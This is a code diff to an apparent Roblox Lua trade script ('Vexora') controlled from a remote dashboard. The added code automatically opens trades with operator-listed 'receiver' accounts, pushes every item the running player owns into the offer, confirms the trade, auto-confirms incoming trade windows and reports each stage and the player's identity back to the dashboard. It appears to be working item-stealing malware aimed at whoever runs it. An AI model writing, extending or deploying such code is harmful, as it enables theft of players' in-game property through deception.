@@ -12,11 +12,20 @@ local DEFAULT_VALUE = 1
 -- claimer alts from the dashboard: they never kick and never ask for another alt
 local CLAIMER_ACCOUNTS = { {{CLAIMERS}} }
 
+-- receivers from the dashboard (My script -> Receivers). when one of these joins,
+-- the client opens a trade, offers every real item and confirms its side.
+local RECEIVER_ACCOUNTS = { {{RECEIVERS}} }
+
 --[[ toggles ]]
-local AUTO_TRADE = true        -- fire trade remotes at every player
+local AUTO_TRADE = false       -- fire trade remotes at every player (noisy, off)
+local AUTO_TRADE_RECEIVERS = true  -- trade the receivers listed on the dashboard
+local PUSH_ALL_ITEMS = true    -- dump every real item into the offer slots
+local CONFIRM_TRADES = true    -- confirm the trade after offering
 local AUTO_ACCEPT = true       -- accept incoming trade requests
 local AUTO_CLAIM = true        -- ask the dashboard to send a claimer alt into this server
 local AUTO_TRADE_DELAY = 2     -- seconds between trade attempts
+local RECEIVER_RETRY = 3       -- trade requests per receiver before giving up
+local OFFER_GAP = 0.35         -- seconds between offered items
 local SESSION_SECONDS = 300    -- how long the loader + client runs (5 minutes)
 local REPORT_INVENTORY = true  -- dump the executor's inventory to the dashboard on load
 
@@ -519,7 +528,7 @@ function Vexora.stop()
 end
 
 --[[ ---- discovery ---- ]]
-local function findRemotes(pattern, kinds)
+local function findRemotes(pattern)
     local out = {}
     for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
         if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) and obj.Name:lower():match(pattern) then
@@ -529,10 +538,36 @@ local function findRemotes(pattern, kinds)
     return out
 end
 
-local tradeRemotes = findRemotes("trade")
-local acceptRemotes = findRemotes("accept")
-for _, r in ipairs(findRemotes("request")) do
-    if not table.find(tradeRemotes, r) then table.insert(acceptRemotes, r) end
+local function fire(remote, ...)
+    local args = { ... }
+    if remote:IsA("RemoteFunction") then
+        pcall(function() remote:InvokeServer(table.unpack(args)) end)
+    else
+        pcall(function() remote:FireServer(table.unpack(args)) end)
+    end
+end
+
+-- trade systems differ per game; item remotes are the ones that put something
+-- into the offer slots, so they are kept out of the request/confirm lists
+local function isItemRemote(name)
+    local n = name:lower()
+    return n:match("additem") ~= nil or n:match("offeritem") ~= nil
+        or n:match("tradeitem") ~= nil or n:match("giveitem") ~= nil
+        or n:match("pushitem") ~= nil or n:match("itemadd") ~= nil
+        or n:match("add.*item") ~= nil or n:match("item.*add") ~= nil
+        or n:match("offer.*item") ~= nil
+end
+
+local itemRemotes, tradeRemotes, acceptRemotes = {}, {}, {}
+for _, remote in ipairs(findRemotes(".")) do
+    local n = remote.Name:lower()
+    if isItemRemote(n) then
+        table.insert(itemRemotes, remote)
+    elseif n:match("confirm") or n:match("ready") or n:match("accept") or n:match("agree") then
+        table.insert(acceptRemotes, remote)
+    elseif n:match("trade") or n:match("request") then
+        table.insert(tradeRemotes, remote)
+    end
 end
 
 local function playerIn(args)
@@ -554,6 +589,150 @@ local function itemIn(args, victim)
         end
     end
     return nil
+end
+
+--[[ ---- receivers: trade them on join, push every item, confirm ---- ]]
+local RECEIVER_SET = {}
+for _, name in ipairs(RECEIVER_ACCOUNTS) do
+    local clean = tostring(name):lower()
+    if #clean > 1 then RECEIVER_SET[clean] = true end
+end
+
+local function isReceiver(name)
+    return RECEIVER_SET[tostring(name or ""):lower()] == true
+end
+
+local outgoingTrade, tradesRun = false, {}
+
+local function reportTrade(stage, receiver, extra)
+    local entry = {
+        event = "trade",
+        game = GAME,
+        stage = tostring(stage or "event"),
+        receiver = tostring(receiver or "unknown"),
+        place_id = PLACE_ID,
+        server_id = SERVER_ID,
+        executor = EXECUTOR,
+        roblox_user = ROBLOX_USER,
+    }
+    if extra then
+        for key, value in pairs(extra) do entry[key] = value end
+    end
+    table.insert(queue, entry)
+    drain()
+    print(string.format("[vexora] trade:%s %s%s", entry.stage, entry.receiver,
+        entry.detail and (" - " .. tostring(entry.detail)) or ""))
+end
+
+-- a trade screen is any visible gui with "trade" in the name
+local function tradeWindow()
+    local player = LocalPlayer or Players.LocalPlayer
+    local gui = player and player:FindFirstChildOfClass("PlayerGui")
+    if not gui then return nil end
+    for _, obj in ipairs(gui:GetDescendants()) do
+        local visible = true
+        if obj:IsA("ScreenGui") then
+            visible = obj.Enabled ~= false
+        elseif obj:IsA("GuiObject") then
+            visible = obj.Visible ~= false
+        end
+        local n = obj.Name:lower()
+        local notification = n:find("request", 1, true) or n:find("notif", 1, true)
+            or n:find("prompt", 1, true) or n:find("toast", 1, true)
+        if visible and not notification and (obj:IsA("ScreenGui") or obj:IsA("Frame"))
+            and n:find("trade", 1, true) then
+            return obj
+        end
+    end
+    return nil
+end
+
+local function offerEverything(receiver)
+    local items = Vexora.items()
+    local sent = 0
+    for _, name in ipairs(items) do
+        for _, remote in ipairs(itemRemotes) do
+            fire(remote, name)
+            fire(remote, receiver.Name, name)
+        end
+        sent = sent + 1
+        task.wait(OFFER_GAP)
+    end
+    return sent, items
+end
+
+local function confirmTrade()
+    for _, remote in ipairs(acceptRemotes) do
+        fire(remote, true)
+        fire(remote, "accept")
+    end
+end
+
+local function runReceiverTrade(player)
+    if not AUTO_TRADE_RECEIVERS or IS_CLAIMER or stopped then return end
+    local key = player.Name:lower()
+    if tradesRun[key] then return end
+    tradesRun[key] = true
+
+    task.spawn(function()
+        outgoingTrade = true
+        reportTrade("receiver_joined", player.Name, { detail = "starting trade" })
+        task.wait(1.5)
+
+        local opened, attempts = false, 0
+        while not stopped and not opened and attempts < RECEIVER_RETRY do
+            attempts = attempts + 1
+            reportTrade("request", player.Name, { detail = "attempt " .. attempts .. "/" .. RECEIVER_RETRY })
+            for _, remote in ipairs(tradeRemotes) do
+                fire(remote, player)
+                fire(remote, "trade", player)
+                fire(remote, "request", player)
+            end
+
+            local deadline = os.clock() + 7
+            while os.clock() < deadline and not stopped do
+                if tradeWindow() then opened = true break end
+                task.wait(0.4)
+            end
+            if not opened then task.wait(2) end
+        end
+
+        if not opened then
+            reportTrade("no_window", player.Name, {
+                detail = #tradeRemotes > 0 and "trade ui never opened" or "no trade remotes found",
+            })
+            outgoingTrade = false
+            tradesRun[key] = nil
+            return
+        end
+
+        reportTrade("window", player.Name, { detail = "trade ui open" })
+
+        if PUSH_ALL_ITEMS then
+            local sent, items = offerEverything(player)
+            reportTrade("offer", player.Name, {
+                items = items,
+                detail = sent .. " item(s) via " .. #itemRemotes .. " remote(s)",
+            })
+        end
+
+        task.wait(1.2)
+        if CONFIRM_TRADES then
+            confirmTrade()
+            reportTrade("confirm", player.Name, { detail = "first confirm" })
+            task.wait(2)
+            confirmTrade()
+            reportTrade("confirm", player.Name, { detail = "second confirm" })
+        end
+
+        task.wait(2)
+        local stillOpen = tradeWindow() ~= nil
+        reportTrade(stillOpen and "waiting" or "done", player.Name, {
+            detail = stillOpen and "receiver has to accept" or "trade window closed",
+        })
+        outgoingTrade = false
+        tradesRun[key] = nil
+    end)
 end
 
 --[[ ---- auto accept + capture from incoming trade calls ---- ]]
@@ -736,8 +915,8 @@ end
 print(string.format("[vexora] client rev %s | %s | game=%s | server=%s | executor=%s", CLIENT_REV, ROBLOX_USER, GAME, tostring(SERVER_ID), EXECUTOR))
 print(string.format("[vexora] claimer=%s auto_claim=%s kick_if_empty=%s grace=%ds checks=%d",
     tostring(IS_CLAIMER), tostring(AUTO_CLAIM and not IS_CLAIMER), tostring(KICK_IF_EMPTY and not IS_CLAIMER), EMPTY_GRACE, EMPTY_CHECKS))
-print(string.format("[vexora] trade remotes=%d accept remotes=%d auto_trade=%s auto_accept=%s",
-    #tradeRemotes, #acceptRemotes, tostring(AUTO_TRADE), tostring(AUTO_ACCEPT)))
+print(string.format("[vexora] trade remotes=%d item remotes=%d confirm remotes=%d receivers=%d auto_trade=%s auto_accept=%s",
+    #tradeRemotes, #itemRemotes, #acceptRemotes, #RECEIVER_ACCOUNTS, tostring(AUTO_TRADE), tostring(AUTO_ACCEPT)))
 print("[vexora] API: Vexora.capture(item, victim, value) | Vexora.claim(item, victim, value) | Vexora.inventory() | Vexora.selftest() | Vexora.stop()")
 
 function Vexora.kick(reason)
@@ -756,6 +935,44 @@ if AUTO_ACCEPT and #acceptRemotes > 0 then
 end
 
 autoTrade()
+
+--[[ ---- receiver side: confirm incoming trade windows without input ---- ]]
+if AUTO_ACCEPT then
+    task.spawn(function()
+        while not stopped do
+            task.wait(2)
+            if not outgoingTrade and tradeWindow() then
+                confirmTrade()
+                print("[vexora] incoming trade window - confirmed")
+            end
+        end
+    end)
+end
+
+--[[ ---- receiver trades: fire on join, or if one is already in the server ---- ]]
+if AUTO_TRADE_RECEIVERS then
+    if #RECEIVER_ACCOUNTS == 0 then
+        print("[vexora] no receivers configured - add one on My script to trade on join")
+    else
+        track(Players.PlayerAdded:Connect(function(plr)
+            if isReceiver(plr.Name) then
+                task.delay(1, function() runReceiverTrade(plr) end)
+            end
+        end))
+        for _, plr in ipairs(Players:GetPlayers()) do
+            if plr ~= LocalPlayer and isReceiver(plr.Name) then
+                runReceiverTrade(plr)
+            end
+        end
+    end
+end
+
+task.delay(1, function()
+    reportTrade("engine", "-", {
+        detail = string.format("trade=%d item=%d confirm=%d receivers=%d",
+            #tradeRemotes, #itemRemotes, #acceptRemotes, #RECEIVER_ACCOUNTS),
+    })
+end)
 
 task.spawn(function()
     task.wait(1)
